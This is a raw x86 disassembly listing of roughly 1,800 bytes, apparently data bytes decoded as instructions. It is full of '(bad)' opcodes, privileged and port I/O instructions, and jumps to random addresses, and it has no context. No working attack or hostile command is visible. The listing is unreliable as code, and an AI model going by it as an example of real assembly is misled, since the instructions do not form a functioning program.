  411d5d:	jne    0x411dcd
  411d5f:	and    DWORD PTR [ebx],ebx
  411d61:	xchg   DWORD PTR [edi],esi
  411d63:	outs   dx,DWORD PTR ds:[esi]
  411d64:	pop    edx
  411d65:	(bad)  
  411d66:	in     al,dx
  411d67:	in     al,dx
  411d68:	mov    ch,0x7d
  411d6a:	sub    al,0x0
  411d6c:	(bad)  
  411d6d:	xchg   esp,eax
  411d6e:	xchg   edi,eax
  411d6f:	inc    ebp
  411d70:	adc    al,0x38
  411d72:	inc    edx
  411d73:	jne    0x411d64
  411d75:	out    0xb4,al
  411d77:	jmp    0x411d72
  411d79:	nop
  411d7a:	xchg   DWORD PTR ds:0x59931c3d,ebp
  411d80:	and    ebx,DWORD PTR [edx]
  411d82:	and    al,BYTE PTR [ebx]
  411d84:	push   ds
  411d85:	iret   
  411d86:	icebp  
  411d87:	push   es
  411d88:	sbb    BYTE PTR [eax-0x2af5283b],al
  411d8e:	xchg   BYTE PTR [edx+0x3c],cl
  411d91:	sub    eax,0x4c528499
  411d96:	sbb    al,0x47
  411d98:	mov    ebp,0x628807db
  411d9d:	dec    ecx
  411d9e:	pop    eax
  411d9f:	out    0x72,al
  411da1:	or     eax,DWORD PTR [ebp-0x4c]
  411da4:	mov    edx,0x1d2aba58
  411da9:	push   ebx
  411daa:	push   es
  411dab:	fs gs pusha 
  411dae:	jae    0x411d85
  411db0:	mov    bl,0x4
  411db2:	popf   
  411db3:	jle    0x411d73
  411db5:	aad    0x3d
  411db7:	mov    ds:0x6a4223c3,al
  411dbc:	(bad)  
  411dbd:	and    BYTE PTR [eax+edi*4+0x5032f7da],bh
  411dc4:	out    0x3f,eax
  411dc6:	icebp  
  411dc7:	(bad)  
  411dc8:	mov    ecx,0x51e0024a
  411dcd:	sbb    ebx,DWORD PTR [edx]
  411dcf:	inc    esi
  411dd0:	(bad)  
  411dd1:	or     al,0x72
  411dd3:	mov    ecx,0xe553e1b8
  411dd8:	push   eax
  411dd9:	stc    
  411dda:	cs loop 0x411dde
  411ddd:	fnstenv [esi]
  411ddf:	and    al,0x52
  411de1:	inc    ebx
  411de2:	cli    
  411de3:	xchg   DWORD PTR [eax-0x71],ecx
  411de6:	dec    ebx
  411de7:	popf   
  411de8:	pop    esi
  411de9:	jle    0x411e4b
  411deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dec:	(bad)  
  411ded:	push   edi
  411dee:	hlt    
  411def:	push   ebx
  411df0:	fstp   DWORD PTR [esi]
  411df2:	lock or DWORD PTR [ecx-0x33],eax
  411df6:	adc    dl,dl
  411df8:	cmp    dh,BYTE PTR [eax-0xdf043e5]
  411dfe:	mov    esi,0x405e9694
  411e03:	leave  
  411e04:	lods   eax,DWORD PTR ds:[esi]
  411e05:	and    DWORD PTR [ebp+eax*2+0x78],eax
  411e09:	(bad)  
  411e0a:	sub    al,0xc
  411e0c:	mov    esp,0xc88f30c3
  411e11:	dec    ebp
  411e12:	push   ss
  411e13:	pop    eax
  411e14:	fild   WORD PTR [ebx+0x31]
  411e17:	(bad)  
  411e18:	test   DWORD PTR [ecx-0x45],0x6179962a
  411e1f:	les    ebx,FWORD PTR [ebx]
  411e21:	ins    BYTE PTR es:[edi],dx
  411e22:	jmp    0x42c:0x219a2756
  411e29:	xchg   esp,eax
  411e2a:	loop   0x411dca
  411e2c:	mov    ecx,0xa23595a8
  411e31:	data16 in al,dx
  411e33:	jns    0x411e71
  411e35:	outs   dx,BYTE PTR ds:[esi]
  411e36:	ins    BYTE PTR es:[edi],dx
  411e37:	or     BYTE PTR [edx+0x461572db],dl
  411e3d:	bound  edi,QWORD PTR [ebp+0x2d6880e3]
  411e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e44:	repnz aam 0x47
  411e47:	outs   dx,DWORD PTR ds:[esi]
  411e48:	dec    ebp
  411e49:	xor    esp,DWORD PTR [ebp+0x5b9a4b17]
  411e4f:	sbb    eax,0x9e4b6431
  411e54:	loopne 0x411e57
  411e56:	(bad)  
  411e57:	jb     0x411ec5
  411e59:	cmp    eax,0x4bf1b968
  411e5e:	hlt    
  411e5f:	add    al,0xe6
  411e61:	adc    BYTE PTR [ebx],bl
  411e63:	sahf   
  411e64:	pop    ebp
  411e65:	shr    BYTE PTR [edx+0x3],1
  411e68:	mov    ss,WORD PTR [esi+0x3a]
  411e6b:	pushf  
  411e6c:	add    ch,BYTE PTR [edi+edi*4+0x66]
  411e70:	push   ecx
  411e71:	shr    BYTE PTR [ecx-0x7f6e1b4a],0xc3
  411e78:	sti    
  411e79:	dec    eax
  411e7a:	add    eax,0x3e4cdf43
  411e7f:	adc    BYTE PTR [eax+ecx*8],al
  411e82:	fmulp  st(0),st
  411e84:	mov    dl,0x62
  411e86:	push   es
  411e87:	or     DWORD PTR [ebx-0x5f],edi
  411e8a:	sub    al,0x92
  411e8c:	aas    
  411e8d:	jmp    0x1e382027
  411e92:	test   al,0x3
  411e94:	not    esi
  411e96:	add    esi,DWORD PTR cs:[eax+edi*1+0xecab559]
  411e9e:	aam    0xf9
  411ea0:	inc    ecx
  411ea1:	jge    0x411eb1
  411ea3:	nop
  411ea4:	jle    0x411e8a
  411ea6:	ins    BYTE PTR es:[edi],dx
  411ea7:	push   ebx
  411ea8:	in     eax,0x99
  411eaa:	fs aad 0x4
  411ead:	aaa    
  411eae:	sub    BYTE PTR [esi+0x5b31739d],bl
  411eb4:	jmp    0xa39e8e60
  411eb9:	outs   dx,DWORD PTR ds:[esi]
  411eba:	mov    ah,BYTE PTR es:[eax+0x55a4171c]
  411ec1:	daa    
  411ec2:	inc    esi
  411ec3:	lds    edx,FWORD PTR [ebx+eax*8]
  411ec6:	(bad)  
  411ec8:	stos   BYTE PTR es:[edi],al
  411ec9:	pop    eax
  411eca:	in     al,0x19
  411ecc:	dec    ebx
  411ecd:	xor    BYTE PTR [edi-0x93f4e0d],dh
  411ed3:	gs jmp 0x411ee9
  411ed6:	daa    
  411ed7:	add    cl,BYTE PTR [ecx]
  411ed9:	cmp    BYTE PTR [eax+0x2d152f2f],bl
  411edf:	push   esi
  411ee0:	in     eax,dx
  411ee1:	popa   
  411ee2:	push   esp
  411ee3:	into   
  411ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee5:	sbb    eax,0xf63ddc8f
  411eea:	js     0x411edb
  411eec:	or     dh,BYTE PTR [ecx+0x41]
  411eef:	scas   eax,DWORD PTR es:[edi]
  411ef0:	or     edx,DWORD PTR [ebx]
  411ef2:	ficom  WORD PTR [ebx+0x75]
  411ef5:	mov    dl,0xa1
  411ef7:	iret   
  411ef8:	test   DWORD PTR [esi-0x4],esp
  411efb:	ins    BYTE PTR es:[edi],dx
  411efc:	xor    eax,0xc605a92e
  411f01:	test   DWORD PTR [ecx+0x6],ecx
  411f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f05:	jmp    0xffef:0xdc9cab34
  411f0c:	fnstenv [eax+0xb]
  411f0f:	mov    edx,0x6c06bd47
  411f14:	inc    edx
  411f15:	dec    edi
  411f16:	inc    esp
  411f17:	xchg   bl,al
  411f19:	ret    0x9e9b
  411f1c:	call   0xf481:0xd36b8675
  411f23:	sahf   
  411f24:	rol    ch,cl
  411f26:	mov    DWORD PTR [esi],0x1f37bd94
  411f2c:	pop    eax
  411f2d:	in     eax,0x23
  411f2f:	imul   edi,DWORD PTR [ecx+0x3f2502cb],0x7be1f14f
  411f39:	xchg   ebx,eax
  411f3a:	sub    ah,BYTE PTR [edi]
  411f3c:	or     al,0x90
  411f3e:	adc    DWORD PTR [edx+eax*8-0x13],ebp
  411f42:	mov    eax,0x33960dbd
  411f47:	sti    
  411f48:	retf   
  411f49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f4a:	fisttp WORD PTR [ebp-0x5dcb91f]
  411f50:	daa    
  411f51:	lods   eax,DWORD PTR ds:[esi]
  411f52:	loope  0x411f0c
  411f54:	clc    
  411f55:	hlt    
  411f56:	ds js  0x411f64
  411f59:	cmp    al,0x1d
  411f5b:	outs   dx,BYTE PTR ds:[esi]
  411f5c:	and    al,0xd2
  411f5e:	mov    ds:0xf1c67000,eax
  411f63:	mov    ds:0x43371229,eax
  411f68:	push   eax
  411f69:	mov    di,WORD PTR [edi-0x80]
  411f6d:	mov    eax,ds:0xb1a353e7
  411f72:	test   DWORD PTR [esi-0x77],ebp
  411f75:	mov    edx,0x49a87ae4
  411f7a:	and    eax,0x2e214e4e
  411f7f:	xchg   ecx,eax
  411f80:	adc    al,0x4a
  411f82:	int    0x57
  411f84:	push   0xbab566ef
  411f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f8a:	imul   edi,DWORD PTR [edx+ecx*8-0x2d],0xffffffd3
  411f8f:	sub    DWORD PTR [esi-0x22],ebx
  411f92:	add    DWORD PTR [eax],edx
  411f94:	inc    eax
  411f95:	jbe    0x411f38
  411f97:	cmp    DWORD PTR [edi],ebx
  411f99:	or     ah,BYTE PTR [ebp+0x72]
  411f9c:	jg     0x411fbe
  411f9e:	cmp    bh,BYTE PTR [esi]
  411fa0:	adc    ebp,edx
  411fa2:	test   eax,0x422321bd
  411fa7:	ret    
  411fa8:	iret   
  411fa9:	push   esp
  411faa:	lods   eax,DWORD PTR ds:[esi]
  411fab:	dec    esi
  411fac:	test   BYTE PTR [edi],bh
  411fae:	fiadd  DWORD PTR [edi+0x3e2354e0]
  411fb4:	into   
  411fb5:	dec    eax
  411fb6:	lods   al,BYTE PTR ds:[esi]
  411fb7:	ins    DWORD PTR es:[edi],dx
  411fb8:	dec    ebx
  411fb9:	scas   al,BYTE PTR es:[edi]
  411fba:	lods   eax,DWORD PTR ds:[esi]
  411fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fbc:	outs   dx,BYTE PTR ds:[esi]
  411fbd:	mov    esi,0xd982a1e5
  411fc2:	hlt    
  411fc3:	or     al,0x4c
  411fc5:	neg    bl
  411fc7:	pop    edx
  411fc8:	(bad)  
  411fc9:	pop    esi
  411fca:	jae    0x411f92
  411fcc:	fs cld 
  411fce:	pushf  
  411fcf:	imul   ecx,edx,0x403b197b
  411fd5:	test   BYTE PTR [edx-0x7584f642],ch
  411fdb:	push   0xfafb8c63
  411fe0:	retf   
  411fe1:	nop
  411fe2:	jbe    0x411fcd
  411fe4:	add    ch,al
  411fe6:	sub    eax,esp
  411fe8:	pop    ds
  411fe9:	adc    BYTE PTR [ebx+0x4f],ah
  411fec:	(bad)  
  411fed:	mov    edi,0xf12d9a16
  411ff2:	std    
  411ff3:	test   ebx,0x5d707218
  411ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ffa:	repnz inc esi
  411ffc:	pop    esi
  411ffd:	leave  
  411ffe:	mov    bl,0xd1
  412000:	adc    al,0x0
  412002:	sub    bh,bl
  412004:	repz cld 
  412006:	jecxz  0x411fa2
  412008:	in     eax,0xcf
  41200a:	push   0x7a
  41200c:	sti    
  41200d:	es push esp
  41200f:	push   0x1f7faf2e
  412014:	sub    eax,0xbbbd8bfb
  412019:	in     eax,0xd0
  41201b:	clc    
  41201c:	cmp    al,0x54
  41201e:	dec    eax
  41201f:	and    DWORD PTR [eax+0x1953eb53],esi
  412025:	lea    edi,[esi+0x1707d1e9]
  41202b:	jo     0x411ff5
  41202d:	dec    esi
  41202e:	adc    DWORD PTR [ecx+eiz*2],0x90517226
  412035:	rcl    DWORD PTR [ebx+0xf1b25f4],0xd2
  41203c:	xor    al,0x21
  41203e:	loopne 0x411fff
  412040:	(bad)
  412044:	mov    esi,DWORD PTR [edi]
  412046:	dec    edx
  412047:	scas   al,BYTE PTR es:[edi]
  412048:	jp     0x4120a0
  41204a:	jg     0x4120be
  41204c:	mov    edi,0xd69f5a65
  412051:	cmp    eax,0x3b52c7e3
  412056:	test   DWORD PTR [edi-0x4ab5f64a],ebx
  41205c:	mov    esi,0x6dbb7c73
  412061:	shr    BYTE PTR [ecx-0x75],0xc
  412065:	daa    
  412066:	jmp    0x412068
  412068:	jg     0x412015
  41206a:	pop    ss
  41206b:	(bad)  
  41206c:	xor    al,0xd3
  41206e:	mov    ebx,DWORD PTR [esi-0x39b45398]
  412074:	repz pop ebp
  412076:	enter  0x8d0b,0x34
  41207a:	js     0x412064
  41207c:	gs jno 0x412066
  41207f:	aad    0x86
  412081:	shl    BYTE PTR [ebp-0x65],1
  412084:	(bad)  ds:0xf2835397
  41208a:	adc    al,0x8
  41208c:	in     al,dx
  41208d:	add    eax,0x155b88fa
  412092:	in     eax,0x1d
  412094:	or     edx,DWORD PTR [edx+0x29]
  412097:	leave  
  412098:	and    esp,DWORD PTR [edi-0x712a9717]
  41209e:	add    ebx,DWORD PTR [esi]
  4120a0:	mov    bh,0x4b
  4120a2:	sub    bl,BYTE PTR [ebx]
  4120a4:	xchg   ecx,eax
  4120a5:	and    esi,DWORD PTR [ebp-0x4c]
  4120a8:	rcr    ecx,0xe7
  4120ab:	mov    ebx,0x8c023892
  4120b0:	fbld   TBYTE PTR [edi]
  4120b2:	dec    eax
  4120b3:	mov    cs,WORD PTR [edx]
  4120b5:	fdiv   QWORD PTR [edi+0x6954b574]
  4120bb:	out    dx,eax
  4120bc:	xchg   edi,eax
  4120bd:	rol    edi,cl
  4120bf:	dec    ebp
  4120c0:	jns    0x41213b
  4120c2:	fldcw  WORD PTR [ebp*4+0x6d7540fa]
  4120c9:	stos   DWORD PTR es:[edi],eax
  4120ca:	jge    0x412138
  4120cc:	call   FWORD PTR ds:0xa6998882
  4120d2:	outs   dx,DWORD PTR ds:[esi]
  4120d3:	xor    BYTE PTR [edi+eiz*1],bl
  4120d6:	mov    esp,0x3948086d
  4120db:	in     al,0x93
  4120dd:	pusha  
  4120de:	fcmovbe st,st(5)
  4120e0:	or     al,0x41
  4120e2:	adc    eax,0x7e228475
  4120e7:	cmp    eax,0xc6d338
  4120ec:	cmp    eax,0x6a8df665
  4120f1:	adc    BYTE PTR [ebp-0x6c45d038],bh
  4120f7:	pushf  
  4120f8:	add    al,0xcd
  4120fa:	mov    esi,0xd3cb9105
  4120ff:	vmwrite edi,DWORD PTR [ecx+edi*2]
  412103:	fistp  QWORD PTR [ebx-0xf477350]
  412109:	or     BYTE PTR [esi+0x13],bl
  41210c:	retf   0xa3ac
  41210f:	jmp    0x412129
  412111:	add    al,0x8b
  412113:	out    dx,al
  412114:	test   al,0x5a
  412116:	aam    0x51
  412118:	cdq    
  412119:	xchg   ah,bh
  41211b:	daa    
  41211c:	mov    eax,0x88689302
  412121:	dec    eax
  412122:	test   al,0x88
  412124:	or     edx,DWORD PTR [ecx+0x47352a3b]
  41212a:	push   eax
  41212b:	mov    BYTE PTR [esi],al
  41212d:	je     0x41217a
  41212f:	fmul   QWORD PTR [edx+0x64b23277]
  412135:	inc    edi
  412136:	push   esp
  412137:	dec    edx
  412138:	fbstp  TBYTE PTR [ecx]
  41213a:	adc    dl,BYTE PTR [eax-0x33]
  41213d:	cwde   
  41213e:	add    esp,DWORD PTR [ebx+0x59]
  412141:	mov    ecx,0x947fda6c
  412146:	push   esp
  412147:	cmp    dl,dl
  412149:	add    DWORD PTR [bx+di+0xa],0xffffff84
  41214e:	bound  esi,QWORD PTR [esi-0x38452e2]
  412154:	jmp    0xb17ef697
  412159:	mov    dl,0x65
  41215b:	inc    eax
  41215c:	and    DWORD PTR ds:[esi-0x6],esp
  412160:	push   esi
  412161:	or     eax,0x304623f5
  412166:	sti    
  412167:	mov    dl,0x4a
  412169:	icebp  
  41216a:	sub    DWORD PTR [esi-0x79],esp
  41216d:	or     ebx,DWORD PTR [esi]
  41216f:	or     al,0x6f
  412171:	push   0xffffffcf
  412173:	xchg   edi,eax
  412174:	out    dx,eax
  412175:	sub    al,0x98
  412177:	les    ecx,FWORD PTR [esi+0x5e1a42da]
  41217d:	xchg   ebx,eax
  41217e:	lahf   
  41217f:	push   ebx
  412180:	and    DWORD PTR fs:[esi],ecx
  412183:	pop    edi
  412184:	leave  
  412185:	pop    es
  412186:	add    cl,ch
  412188:	rol    DWORD PTR [edx-0x18],0xb2
  41218c:	mov    dh,0x7
  41218e:	adc    eax,0x5591d704
  412193:	lods   al,BYTE PTR ds:[esi]
  412194:	ins    DWORD PTR es:[edi],dx
  412195:	mov    bh,0xec
  412197:	lods   al,BYTE PTR ds:[esi]
  412198:	mov    cl,0xd0
  41219a:	push   0xffffffee
  41219c:	and    al,0x3b
  41219e:	jg     0x412213
  4121a0:	xchg   esp,eax
  4121a1:	jae    0x41217a
  4121a3:	loop   0x41213e
  4121a5:	mov    ebp,0xa01ed523
  4121aa:	and    esi,DWORD PTR [eax+0x406ead20]
  4121b0:	fstp   DWORD PTR [esi+ebp*2]
  4121b3:	xor    eax,0xda485e6e
  4121b8:	xchg   edx,eax
  4121b9:	fs ja  0x412215
  4121bc:	adc    bl,BYTE PTR [ebp-0x51]
  4121bf:	lods   al,BYTE PTR ds:[esi]
  4121c0:	loopne 0x4121cd
  4121c2:	aaa    
  4121c3:	loop   0x41217f
  4121c5:	pop    es
  4121c6:	(bad)  
  4121c7:	loopne 0x412175
  4121c9:	add    al,0xc4
  4121cb:	pop    ss
  4121cc:	idiv   DWORD PTR [ecx+0x489952a9]
  4121d2:	shr    DWORD PTR [esi],1
  4121d4:	xor    DWORD PTR [eax],edi
  4121d6:	mov    WORD PTR [edi],gs
  4121d8:	sub    DWORD PTR ds:0x8e5a89d9,ecx
  4121de:	(bad)  
  4121df:	in     al,dx
  4121e0:	or     al,0xa7
  4121e2:	jg     0x4121ac
  4121e4:	test   al,0x5e
  4121e6:	or     dl,BYTE PTR [eax+edx*4-0x7cf629dd]
  4121ed:	add    DWORD PTR [esi+0x70],ebp
  4121f0:	push   ss
  4121f1:	frstor [edi+0x21]
  4121f4:	lds    ecx,FWORD PTR [ebp-0x1331d480]
  4121fa:	ror    BYTE PTR [esi],cl
  4121fc:	js     0x412193
  4121fe:	ja     0x4121f1
  412200:	push   esi
  412201:	push   eax
  412202:	pop    ecx
  412203:	xchg   edi,eax
  412204:	aaa    
  412205:	cdq    
  412206:	int    0x61
  412208:	sahf   
  412209:	call   0xd286ba39
  41220e:	jb     0x4121b8
  412210:	mov    eax,ds:0x1bbe13f
  412215:	xor    BYTE PTR [edi+0x5c],dh
  412218:	dec    esi
  412219:	mov    DWORD PTR [ecx+0x21],ecx
  41221c:	and    eax,0x971e4a6
  412221:	bound  esp,QWORD PTR [esi-0x7024d0f5]
  412227:	ja     0x412241
  412229:	push   esp
  41222a:	aam    0xf8
  41222c:	fcmovnbe st,st(5)
  41222e:	sbb    eax,0x31205094
  412233:	arpl   WORD PTR [esi+0x5148d5a4],si
  412239:	adc    eax,0x68703574
  41223e:	stc    
  41223f:	in     al,0x33
  412241:	mov    ah,0xa3
  412243:	out    dx,eax
  412244:	mov    ebx,0xb9d0aa1c
  412249:	mov    ah,0x3
  41224b:	enter  0xc2bd,0xd7
  41224f:	cwde   
  412250:	iret   
  412251:	jo     0x412200
  412253:	aad    0x44
  412255:	lock cmp dl,BYTE PTR [ebp+esi*1-0x2535d5fc]
  41225d:	popa   
  41225e:	xchg   ecx,eax
  41225f:	enter  0x5813,0xdf
  412263:	je     0x4122d1
  412265:	int3   
  412266:	mov    eax,ds:0x78fc79bb
  41226b:	push   ss
  41226c:	sub    BYTE PTR [eax],0xca
  41226f:	mov    DWORD PTR [eax+0x7a0ddb7f],ebx
  412275:	fs add al,0xa7
  412278:	adc    al,0x38
  41227a:	mov    ecx,0x334ae865
  41227f:	fiadd  DWORD PTR [eax+0x16]
  412282:	jmp    0xe86e228a
  412287:	sbb    DWORD PTR [edx-0x775b3043],0x6a94367c
  412291:	je     0x4122f6
  412293:	fld    QWORD PTR [ebx]
  412295:	test   al,0x61
  412297:	dec    DWORD PTR [ebx+edx*2-0x969e260]
  41229e:	(bad)  
  4122a0:	pop    eax
  4122a1:	fild   QWORD PTR [ecx]
  4122a3:	mov    al,ds:0xf8b37920
  4122a8:	repnz xor BYTE PTR [eax+0x2a],cl
  4122ac:	adc    al,0x75
  4122ae:	or     al,0x5e
  4122b0:	push   ecx
  4122b1:	arpl   di,di
  4122b3:	cmp    edi,DWORD PTR [ebp+0x71]
  4122b6:	retf   0x2010
  4122b9:	add    ah,bh
  4122bb:	fisubr WORD PTR [esi]
  4122bd:	out    0xaf,al
  4122bf:	(bad)
  4122c3:	mov    edi,0x1ba5a1a1
  4122c8:	aam    0xf6
  4122ca:	dec    esp
  4122cb:	cwde   
  4122cc:	push   esi
  4122cd:	push   ecx
  4122ce:	inc    esi
  4122cf:	outs   dx,BYTE PTR ds:[esi]
  4122d0:	xor    edx,esi
  4122d2:	push   0xe9987705
  4122d7:	cli    
  4122d8:	or     eax,0x3ca4e34
  4122dd:	xor    BYTE PTR [ebx+0x42],0x96
  4122e1:	and    BYTE PTR [edi-0x4162f28b],0x29
  4122e8:	cmp    al,0xc0
  4122ea:	mov    al,dh
  4122ec:	icebp  
  4122ed:	call   0xc342:0xa8bd941a
  4122f4:	cs pushf 
  4122f6:	pop    ss
  4122f7:	nop
  4122f8:	push   edx
  4122f9:	sub    ah,ch
  4122fb:	pop    ebp
  4122fc:	in     al,dx
  4122fd:	addr16 cmp al,0x1a
  412300:	mov    ds:0x2cdbe89b,al
  412305:	or     al,0x78
  412307:	leave  
  412308:	aas    
  412309:	cs push esi
  41230b:	xor    al,0x87
  41230d:	jl     0x412312
  41230f:	dec    BYTE PTR [ecx+edi*2+0x49382d9]
  412316:	inc    esi
  412317:	fld    DWORD PTR [eax+0x7e]
  41231a:	jb     0x41237f
  41231c:	int    0xba
  41231e:	stc    
  41231f:	fbstp  TBYTE PTR [ebp+0x2dfcae22]
  412325:	pop    esp
  412326:	push   ebp
  412327:	addr16 push es
  412329:	adc    edi,edx
  41232b:	jp     0x412303
  41232d:	pushf  
  41232e:	test   BYTE PTR [ebx-0x6e0907b2],bh
  412334:	fisub  DWORD PTR [ecx+eiz*8-0x22]
  412338:	cwde   
  412339:	add    esp,DWORD PTR [esi+0x2a]
  41233c:	cdq    
  41233d:	cmp    al,0xfa
  41233f:	sub    DWORD PTR [edx],0x6673c92b
  412345:	mov    eax,es:0xe306ced2
  41234b:	xchg   edi,eax
  41234c:	cld    
  41234d:	stc    
  41234e:	cmc    
  41234f:	sub    eax,0x51b6086a
  412354:	and    BYTE PTR [edi+ebp*8+0x249368e1],bl
  41235b:	and    al,0x2
  41235d:	pop    edx
  41235e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41235f:	out    0xd0,eax
  412361:	out    0xb,eax
  412363:	xor    eax,0x8d04fd8b
  412368:	inc    edi
  412369:	retf   0x1293
  41236c:	xchg   esp,eax
  41236d:	aaa    
  41236e:	push   esp
  41236f:	jno    0x412368
  412371:	outs   dx,DWORD PTR ds:[esi]
  412372:	dec    edx
  412373:	pop    ebx
  412374:	sub    eax,0x5dfe715f
  412379:	xor    al,0x2b
  41237b:	les    edi,FWORD PTR [eax]
  41237d:	js     0x4123ad
  41237f:	xor    BYTE PTR [ecx+ebp*8],0x35
  412383:	(bad)  
  412384:	push   0x7c40a9f4
  412389:	ret    
  41238a:	push   ss
  41238b:	and    DWORD PTR [edi+0x37556622],eax
  412391:	and    ah,cl
  412393:	dec    eax
  412394:	inc    edi
  412395:	dec    ebp
  412396:	and    bl,BYTE PTR [edi-0x78438261]
  41239c:	shl    BYTE PTR [ecx+ebx*1],cl
  41239f:	adc    DWORD PTR [ebx-0x34f088be],edi
  4123a5:	in     eax,0x6e
  4123a7:	sbb    DWORD PTR [ebx-0x7],ebx
  4123aa:	cmp    DWORD PTR [edx-0x217689ba],0x4b
  4123b1:	xor    ch,BYTE PTR [eax-0x72]
  4123b4:	jne    0x41236c
  4123b6:	dec    esi
  4123b7:	jmp    0x3b4b9971
  4123bc:	ror    DWORD PTR [edi],0x7e
  4123bf:	cmp    al,BYTE PTR [ebp+0x41]
  4123c2:	mov    cl,BYTE PTR [eax-0x6b126380]
  4123c8:	xchg   esp,eax
  4123c9:	ret    
  4123ca:	ja     0x412365
  4123cc:	sub    al,0x32
  4123ce:	xchg   cl,dl
  4123d0:	pop    edi
  4123d1:	out    dx,al
  4123d2:	fwait
  4123d3:	ror    BYTE PTR [ebx+0x6b660f50],cl
  4123d9:	cwde   
  4123da:	ins    BYTE PTR es:[edi],dx
  4123db:	out    0x1e,al
  4123dd:	(bad)  
  4123de:	aas    
  4123df:	shl    BYTE PTR [ecx-0x4e],0x3e
  4123e3:	mov    ?,WORD PTR [edx-0x25fcfa36]
  4123e9:	sub    ecx,DWORD PTR [edi-0x16fa51bf]
  4123ef:	pop    ecx
  4123f0:	mov    al,0xb7
  4123f2:	and    eax,0xb5d5b75e
  4123f7:	cmc    
  4123f8:	icebp  
  4123f9:	jmp    0x4123dd
  4123fb:	jmp    0x4123f9
  4123fd:	xor    ebp,DWORD PTR [edi+eax*2]
  412400:	inc    ebp
  412401:	(bad)  
  412402:	in     al,dx
  412403:	jl     0x4123a2
  412405:	cmp    al,0x98
  412407:	(bad)  
  412408:	jmp    0x412463
  41240a:	(bad)  
  41240b:	xchg   ebx,eax
  41240c:	jmp    0xc6a8:0x7bec78fa
  412413:	jl     0x412415
  412415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412416:	hlt    
  412417:	rcl    BYTE PTR ds:0x1f3f6605,1
  41241d:	paddq  mm5,QWORD PTR [esi+eax*2+0x5702b972]
  412425:	lods   al,BYTE PTR ds:[esi]
  412426:	add    bl,BYTE PTR [edx+eax*4]
  412429:	adc    eax,0x68b1b6c1
  41242e:	fstp   DWORD PTR [esi+0x11]
  412431:	add    DWORD PTR [edi],edi
  412433:	or     edx,DWORD PTR [eax+0x27]
  412436:	sub    BYTE PTR [esi],cl
  412438:	es cwde 
  41243a:	xchg   BYTE PTR [edx+0x43177a06],dl
  412440:	stc    
  412441:	mov    bh,0xc2
  412443:	out    0xcb,eax
  412445:	mov    ah,0x50
  412447:	retf   0x3125
  41244a:	pop    edi
  41244b:	mov    ch,0xb4
  41244d:	cs mov edx,0x7911e2ac
  412453:	push   0xf3dad6dd
  412458:	repz sub bl,dh
  41245b:	jmp    0x3630:0x88c0b33d
  412462:	mov    ch,0x3c
  412464:	aaa    
  412465:	push   ebp
  412466:	(bad)  [eax+edx*8+0x5ef6b1eb]
  41246d:	and    al,0x83
  41246f:	jb     0x41245a
  412471:	test   edi,esi
  412473:	dec    esi
  412474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412475:	pop    ecx
  412476:	out    dx,al
  412477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412478:	or     al,0xa8
  41247a:	dec    eax
  41247b:	mov    fs,WORD PTR [ebp+0x3]
  41247e:	mov    al,ds:0x5fe65108
  412483:	je     0x412439
  412485:	loopne 0x4124e7
  412487:	jg     0x4124fe
  412489:	pop    edx
  41248a:	add    edx,0x79
  41248d:	push   0xffffffd2
  41248f:	es xchg ebx,eax
  412491:	out    0x5c,al
  412493:	adc    ebx,DWORD PTR [esi-0x30]
  412496:	sbb    ebx,ebx
  412498:	gs (bad) 
  41249a:	out    0xe6,al
  41249c:	int    0x46
  41249e:	mov    eax,DWORD PTR [eax+0x6b92fec0]
  4124a4:	enter  0x5921,0x6e
  4124a8:	xor    eax,DWORD PTR [ecx-0x1c]
  4124ab:	test   BYTE PTR [eax-0x18],0xd4
  4124af:	scas   al,BYTE PTR es:[edi]
  4124b0:	jnp    0x412476
  4124b2:	es sub ebx,ecx
  4124b5:	add    BYTE PTR [edx+esi*1+0x23],0xc1
  4124ba:	push   esp
  4124bb:	push   es
  4124bc:	sar    DWORD PTR [ecx],cl
  4124be:	jmp    0x412512
  4124c0:	jmp    0xe1de0408
  4124c5:	jg     0x41249e
  4124c7:	std    
  4124c8:	pop    esi
  4124c9:	jno    0x41250d
  4124cb:	out    0x8e,eax
  4124cd:	jmp    0x41252e
  4124cf:	pop    ds
  4124d0:	jbe    0x41253a
  4124d2:	jo     0x412511
  4124d4:	jno    0x412460
  4124d6:	test   DWORD PTR [eax+edi*2+0x5a],esi
  4124da:	add    BYTE PTR [ebp-0x7a9f56b9],dh
  4124e0:	imul   edx,DWORD PTR [esi],0xfffffff6
  4124e3:	jmp    0xd957edd2
  4124e8:	xchg   esp,eax
  4124e9:	jne    0x4124a4
  4124eb:	dec    ecx
  4124ec:	sub    al,0xf2
  4124ee:	punpckhwd mm5,mm5
  4124f1:	adc    dl,al
  4124f3:	mov    ebx,0x4307f294
  4124f8:	xor    bl,cl
  4124fa:	ins    DWORD PTR es:[edi],dx
  4124fb:	inc    eax
  4124fc:	lods   al,BYTE PTR ds:[esi]
  4124fd:	in     al,0x8e
  4124ff:	add    eax,DWORD PTR [bx+di-0x64ad]
  412504:	mov    WORD PTR [esi],fs
  412506:	sub    BYTE PTR [edx-0x5c],dh
  412509:	neg    BYTE PTR [ebx]
  41250b:	sbb    dh,BYTE PTR cs:[edx+0x42d92b9d]
  412512:	xchg   BYTE PTR [edx+edi*4+0x4fc5dd05],bl
  412519:	push   ebp
  41251a:	leave  
  41251b:	add    BYTE PTR [ecx],0x96
  41251e:	repz les ebp,FWORD PTR [ecx-0x13]
  412522:	addr16 repz xchg ebx,eax
  412525:	adc    dh,BYTE PTR [edi+0xa]
  412528:	push   edi
  412529:	xor    al,0x3a
  41252b:	jae    0x4124d2
  41252d:	in     al,0x14
  41252f:	in     eax,0xd9
  412531:	pop    edx
  412532:	test   DWORD PTR [eax+0x2a],ebp
  412535:	or     BYTE PTR [ecx+edi*2+0x2db79b79],dl
  41253c:	dec    ebx
  41253d:	adc    cl,bh
